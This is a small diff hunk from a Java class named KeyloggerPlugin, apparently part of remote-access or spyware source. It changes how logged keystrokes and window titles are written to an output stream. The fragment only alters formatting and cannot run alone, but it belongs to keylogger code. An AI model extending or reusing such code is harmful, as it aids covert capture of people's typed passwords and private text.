@@ -151,7 +151,7 @@ public class KeyloggerPlugin extends StubPlugin {
 							if (a instanceof Title) {
 								out.println("\n\r" + a.toString() + "\n\r\n\r");
 							} else if (a instanceof Key) {
-								out.println(((Key)a).getChar());
+								out.print(((Key)a).getChar());
 							}
 						}
 						
